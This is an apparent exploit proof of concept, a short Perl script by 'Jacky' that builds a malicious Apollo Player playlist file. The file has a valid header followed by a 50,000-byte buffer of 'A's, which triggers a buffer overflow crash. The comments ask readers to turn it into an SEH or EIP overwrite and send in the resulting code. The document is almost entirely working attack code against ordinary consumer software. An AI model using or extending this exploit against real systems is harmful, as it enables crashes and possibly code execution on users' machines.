#Apollo Player 37.0.0.0 .aap BOF DOS Vulnerability
#Discovered and Written by : (jacky )
#Greetz to Peter Van Eeckhoutte and all Corelanc0d3r team ( Rick & mr_me & MarKoT &Edi)
#When you play normal songs and you save the playlist as .aap , and then open it up with notepad , u will note that it contains a header that MUST be written at the beginning of our malicious file ( I Like this type of exploits :P COOL !!! )
#If anyone can Overwrite the SEH chain or eip by some how method , just send your exploit's code to ( Jacky_thekiller@hotmail.com ) and i will be very happy of that ^.^
my $file="Crash.aap";
my $header="[Apollo Advanced Playlist]\nVersion=1.00\n[Entries]\nEntry1=";  #Playlist Header!!!
my $junk="A"x50000;                # A Random buffer to just make a crash .
my $end="\nNumberOfEntries=2";        #Playlist End !!!
open(POOH,">$file");
print POOH $header.$junk.$end;
print "[+]Malicious File created successfully!\n";
print "[+]Discovered and Coded by Jacky ( ME ) :P\n";
close(POOH);